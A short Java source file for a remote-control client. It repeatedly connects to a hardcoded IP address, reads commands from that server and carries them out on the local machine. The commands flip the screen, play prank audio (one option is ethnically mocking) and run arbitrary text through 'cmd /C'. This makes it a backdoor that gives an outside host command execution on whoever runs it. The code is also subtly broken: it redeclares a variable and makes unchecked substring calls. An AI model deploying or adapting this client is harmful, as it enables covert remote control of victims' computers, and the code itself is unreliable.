
import java.io.*;
import java.net.*;
import java.awt.*;
import java.awt.event.*;
import java.io.IOException;
import java.net.URL;

public class client {
	private static boolean goOn=true;
	public static void main(String[] args) throws Exception {

		client client = new client();
		client.run();

	}

	public void run() throws Exception{
		Socket SOCK;
		while(goOn){

			SOCK = new Socket("128.4.111.223",1025);
			PrintStream PS = new PrintStream(SOCK.getOutputStream());
			PS.println("Enter command: ");
			InputStreamReader IR = new InputStreamReader(SOCK.getInputStream());
			BufferedReader BR = new BufferedReader(IR);
			String cmd = BR.readLine();
			processCmd(cmd);
			SOCK.close();
		}

		//Thread.sleep(1000*60*5);//sleeps 5 minutes
		//check for ip
		//reconnect to server if server up


	}

	private static void processCmd(String cmd){
		if(cmd.equals("flip-screen")){
			flipScreen();
		}
		else if (cmd.equals("quit")){
			goOn=false;
		}
		else if (cmd.equals("play-asian-music")){
			playAsianMusic();
		}else if (cmd.substring(0,10).equals("play-music")){
			String loc = cmd.substring(11,cmd.length());
			System.out.println(loc);
			URL url = null;
			try{
				url = new URL(loc);
			}catch(IOException e){
			e.printStackTrace();
		}
			playBorisWebMusic(url);
		}

		else if (cmd.substring(0,3).equals("cmd")) {
			String cmd=cmd.substring(4,cmd.length());
			cmd(cmd);
		}

	}

	private static void flipScreen(){
		try {
			Robot r = new Robot();
			r.keyPress(KeyEvent.VK_CONTROL);
			r.keyPress(KeyEvent.VK_ALT);
			r.keyPress(KeyEvent.VK_DOWN);
			long lastTime = System.currentTimeMillis();
			while(System.currentTimeMillis() - lastTime < 300){

			}
			r.keyRelease(KeyEvent.VK_CONTROL);
			r.keyRelease(KeyEvent.VK_ALT);
			r.keyRelease(KeyEvent.VK_DOWN);

		} catch (AWTException e) {
			e.printStackTrace();
		}
	}

	private static void playAsianMusic(){
		try {
			URL song = new URL("http://www.abrahamd.mcilvaine.net/audio/chinese-music.wav");
			SoundDoer sd = new SoundDoer();
			sd.loadClip(song);
			sd.playLoadedClip(0);

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static void playBorisWebMusic(URL url){
		try{
			SoundDoer sd = new SoundDoer();
			sd.loadClip(url);
			sd.playLoadedClip(0);

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static void cmd(String cmd) {
		Runtime r = Runtime.getRuntime();
		try {
			r.exec("cmd /C \""+cmd+"\"");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}
